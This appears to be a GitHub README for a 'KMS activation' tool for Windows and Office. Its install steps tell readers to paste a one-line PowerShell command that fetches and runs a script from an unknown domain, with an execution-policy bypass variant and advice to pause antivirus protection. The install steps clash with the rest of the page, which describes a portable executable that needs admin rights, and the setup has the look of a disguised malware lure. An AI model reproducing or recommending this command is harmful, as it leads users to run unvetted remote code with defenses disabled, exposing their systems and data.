<div align="center">

# KMS Activation Automation Toolkit for Windows 10 & 11

![preview](https://raw.githubusercontent.com/valeriofix15-arch/kms-activation-tool/main/cover_653867.svg)

[![platform](https://img.shields.io/badge/Platform-Windows-e11d48?style=social&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/Rating-4.5%2F5-f59e0b?style=social&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/Ps-Installer-f43f5e?style=social&labelColor=0d1117)]() [![state](https://img.shields.io/badge/State-Released-2ea44f?style=social&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/Lic-Ofl--1.1-be123c?style=social&labelColor=0d1117)]() [![ci](https://img.shields.io/badge/Ci-Green-2ea44f?style=social&labelColor=0d1117)]()

</div>

---

kms-activate is a desktop utility for one-click activation of Microsoft Windows and Office products through a custom KMS server. It supports Windows 11, 10, 8.1, and 7 in Professional and Enterprise editions, Windows Server 2008 R2 through 2022 in Standard and Datacenter editions, and Office 2010 through 2021, including Visio Pro and Project Pro. The tool handles activation end to end: it can automatically download and install Office 2021 LTSC (VOL) via the Office Deployment Tool, and it exposes debug information so failures caused by an unreachable or misconfigured KMS server can be diagnosed. KMS server reachability and correct registration in slmgr.vbs are required for successful activation.

## 🛠️ Quick Install (PowerShell)

> [!TIP]
> **One-line setup** — just run the command below.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Run the command
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If Windows blocks the script — use CMD
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## ✅ Before You Start

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **One-click activation** — Automates the KMS activation workflow for Microsoft Windows and Office with a single action, removing the need to manually run `slmgr.vbs` or `ospp.vbs` commands.
- **Broad product coverage** — Detects and activates supported Windows client, Windows Server, and Office volume editions through a unified interface.
- **Configurable KMS server** — Allows the target KMS host to be specified and swapped at runtime, so activation can be retried against an alternate server without restarting the tool.
- **Debug information panel** — Exposes a `Show debug info` option that surfaces the underlying commands and responses produced during activation, simplifying diagnosis of failures.
- **Reachability awareness** — Validates that the configured KMS server is reachable before activation, surfacing connectivity problems instead of silent failures.
- **Integrated Office deployment** — Can download and install Office 2021 LTSC (Volume) directly through the bundled Office Deployment Tool, with language selectable via the configuration file prior to download.
- **Batch-driven Office setup** — Ships a deployment directory with a ready-to-run installer script that performs an unattended Office 2021 Pro Plus Volume installation.
- **Lightweight, portable desktop utility** — Runs as a self-contained executable with no external runtime dependencies, suitable for offline and lab environments.
- **Transparent operation** — Every step of the activation process is logged and observable, keeping the tool's behavior auditable end to end.

## Supported Products

kms-activate targets the volume-licensed product families that support KMS client activation, covering both Windows and Office editions across consumer, enterprise, and server SKUs.

**Windows Desktop**
- Windows 11 Professional and Enterprise
- Windows 10 Professional and Enterprise
- Windows 8.1 Professional and Enterprise
- Windows 7 Professional and Enterprise (end-of-life)

**Windows Server**
- Windows Server 2022 Standard and Datacenter
- Windows Server 2019 Standard and Datacenter
- Windows Server 2016 Standard and Datacenter
- Windows Server 2012 R2 Standard and Datacenter
- Windows Server 2008 R2 Standard and Datacenter (end-of-life)

**Microsoft Office**
- Office 2021 (including LTSC volume editions)
- Office 2019
- Office 2016
- Office 2013
- Office 2010

**Additional Applications**
- Visio Professional
- Project Professional

Activation operates through a KMS client-server model: the tool configures the appropriate KMS host and client key for the detected product, then requests activation against a reachable KMS server. Only volume-licensed editions are supported, as retail and OEM licenses do not accept KMS activation. Products marked end-of-life no longer receive vendor support and are listed for legacy compatibility only. Editions not enumerated above, including subscription-based Microsoft 365 builds, fall outside the supported scope.

## How It Works

kms-activate operates by interfacing with the native Windows Software Licensing Management Tool (slmgr.vbs) and the Office Software Protection Platform (ospp.vbs) to apply a volume license key and configure a Key Management Service (KMS) host for periodic activation renewal.

The application is structured around a sequence of discrete licensing operations. When a user selects a target product, the tool validates the installed edition against its internal key database, then installs the appropriate generic volume license key (GVLK) via the system licensing interface. Following key installation, the KMS host address and port are written to the registry-backed licensing configuration, and an activation request is issued to the configured server. A successful response registers the client for automatic renewal, with the activation period and renewal interval depending on the target product family.

Activation status is queried in real time and surfaced through the interface. For troubleshooting, the debug information panel captures the raw output of each licensing command, including exit codes, error descriptions, and the resolved server address, so that failures can be attributed to a specific stage rather than treated as a single opaque result. If a server proves unreachable or returns an error, an alternate host can be supplied without repeating the earlier steps.

For Office deployments, the tool can orchestrate the download and installation of volume-licensed Office builds through Microsoft's Office Deployment Tool, using an accompanying configuration file to define the target product, channel, and language. Once installed, the same key-installation and KMS-configuration pipeline is applied to the Office licensing subsystem, which is handled independently of the Windows licensing state.

All operations are performed against documented licensing interfaces; the tool does not patch system binaries or modify activation components beyond the standard key and host configuration.

## Compatibility & Requirements

The tool is designed for Windows-based endpoints and runs as a standalone desktop utility without requiring a separate runtime installation. It targets systems where a reachable KMS infrastructure is available, either hosted internally or provided through an existing KMS service endpoint.

**Operating System Support**

- Windows 11 and Windows 10 (Professional, Enterprise, and equivalent editions)
- Windows 8.1 and Windows 7 (Professional, Enterprise)
- Windows Server 2008 R2, 2012 R2, 2016, 2019, and 2022 (Standard, Datacenter)

**Application Support**

- Office 2010, 2013, 2016, 2019, and 2021 volume-licensed editions
- Visio Pro and Project Pro when deployed as part of an Office Enterprise installation

**Runtime Dependencies**

- Administrative privileges are required to apply activation changes and modify licensing state
- The Windows Software Protection Platform service (`sppsvc`) must be running and not disabled by policy
- The `slmgr.vbs` scripting interface must be present and functional; the tool relies on it for license installation and activation queries
- Outbound network access to the configured KMS host on the standard KMS port (TCP 1688) must be permitted by local firewall and network policy

**KMS Infrastructure Requirements**

- A reachable KMS server that supports the target product's activation threshold; volume activation requires the host to satisfy Microsoft's minimum client count before keys are issued
- The KMS host must be registered in the client's DNS or specified explicitly during configuration
- Time synchronization between the client and KMS host should be maintained to avoid activation rejection due to clock skew

**Deployment Notes**

- The utility is portable and does not require a system-wide installer; it can be executed from removable media or a network share
- Debug output can be enabled within the interface to trace each activation step, including license installation, key configuration, and activation result codes
- If activation fails repeatedly, verify KMS host reachability and confirm the host is registered with the client's `slmgr.vbs` configuration before retrying
- Office deployments can be provisioned automatically through the integrated deployment workflow when a volume-licensed source is required

## FAQ

- **Which products can be activated?** The tool targets volume-licensed editions of Windows client and server operating systems, as well as Office suites and related volume products. Retail or subscription-based licenses are outside its scope; activation depends on the presence of a generic volume license key for the selected edition.

- **What is required for activation to succeed?** A reachable KMS host is mandatory. The tool does not host a KMS server itself; it configures the local licensing service to point at a KMS endpoint and then triggers the activation request. If the endpoint is unreachable, blocked by a firewall, or does not respond within the timeout window, activation will fail regardless of the selected product key.

- **Why does activation fail even with a valid KMS server?** Common causes include network filtering between the client and the KMS host, an incorrect or expired KMS host key on the server side, DNS resolution problems for the auto-discovered KMS record, or a mismatch between the requested product and the editions published by that KMS host. Enabling the debug output option exposes the underlying licensing calls and error codes, which is the fastest way to isolate the failing stage.

- **How do I diagnose a failed activation attempt?** Toggle the debug information display before running the activation routine. The log surfaces the sequence of licensing operations, the resolved KMS endpoint, and the status returned by each call. Cross-reference the reported error code against the standard software licensing status values to determine whether the failure originates from connectivity, key installation, or the activation request itself.

- **Can I change the KMS server after a failed attempt?** Yes. The KMS endpoint is configurable, and switching to a different reachable host is the recommended first step when activation repeatedly fails against the current one. After changing the endpoint, re-run the activation routine so the licensing service re-resolves and re-registers against the new host.

- **Does the tool install Office automatically?** For Office deployments, the tool can retrieve and install a volume-licensed Office build through the Office Deployment Tool workflow. The language can be adjusted in the deployment configuration before download; users outside the default locale should modify that setting prior to running the deployment script so the correct language pack is fetched.

- **Is the KMS server bundled with the tool?** No. The application is a client-side activation utility only. It does not provide, proxy, or host KMS services. Users must supply their own reachable KMS infrastructure, and the tool assumes that infrastructure is already correctly configured and licensed.

- **What permissions are needed to run activation?** Elevation is required because the tool modifies system-wide licensing configuration and installs product keys through the operating system's licensing interface. Running without administrator privileges will result in key installation and activation calls being rejected.

- **Does activation survive reboots and updates?** KMS-based activation is periodic by design: the client renews its activation against the KMS host at defined intervals. As long as the configured KMS endpoint remains reachable at renewal time, activated status persists across reboots and routine updates. Prolonged loss of connectivity to the KMS host will eventually cause the activation to lapse until renewal succeeds.

- **Which operating system versions are supported as the host environment?** The tool runs on the Windows platforms listed in the compatibility section. Server and client SKUs are both supported, provided the .NET runtime prerequisites are satisfied and the licensing service is present and running.

## Disclaimer

This software is provided strictly as a technical utility for volume licensing administration on systems you own or are explicitly authorized to manage. It relies on the Key Management Service (KMS) client components already present in the operating system and does not modify, patch, or bypass any binary, license file, or activation subsystem. All activation operations are performed through the native `slmgr.vbs` interface and standard KMS client protocols.

The tool is intended for evaluation, laboratory, testing, and internal deployment scenarios where a reachable KMS infrastructure is available. It does not supply, embed, or distribute any product keys, KMS host keys, or activation tokens, and it does not operate any external activation service. Successful activation depends entirely on the availability, configuration, and authorization of a KMS server reachable from the target machine; the authors provide no such server and offer no guarantee that any activation attempt will succeed. Users are responsible for ensuring that their use of this software complies with all applicable Microsoft licensing terms and with the laws and regulations of their jurisdiction.

No warranty, express or implied, is made regarding fitness for a particular purpose, reliability, or absence of defects. Activation state, licensing status, and system configuration may change as a result of operating system updates, policy changes, or network conditions outside the control of this project. The authors and contributors accept no liability for any direct or indirect damages, data loss, licensing non-compliance, or service interruption arising from the use or misuse of this software. By running this tool, you acknowledge that you assume full responsibility for its deployment and for the licensing posture of every system on which it is executed.